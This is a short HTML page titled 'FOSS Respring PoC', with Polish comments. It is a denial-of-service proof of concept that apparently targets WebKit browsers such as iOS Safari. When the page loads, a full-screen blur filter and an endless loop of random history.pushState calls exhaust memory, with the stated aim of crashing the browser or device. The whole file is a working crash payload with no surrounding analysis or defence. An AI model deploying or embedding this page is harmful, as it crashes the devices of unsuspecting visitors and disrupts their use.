<!DOCTYPE html>
<html>
<head>
    <title>FOSS Respring PoC</title>
    <style>
        /* Skrajnie zasobożerne style CSS zmuszające WebKit do awarii */
        div {
            backdrop-filter: blur(100px);
            -webkit-backdrop-filter: blur(100px);
            width: 100vw;
            height: 100vh;
        }
    </style>
</head>
<body>
    <div></div>
    <script>
        // Nieskończona pętla generująca potężne obciążenie pamięci (Memory Leak)
        while (true) {
            window.history.pushState(null, null, Math.random().toString());
        }
    </script>
</body>
</html>
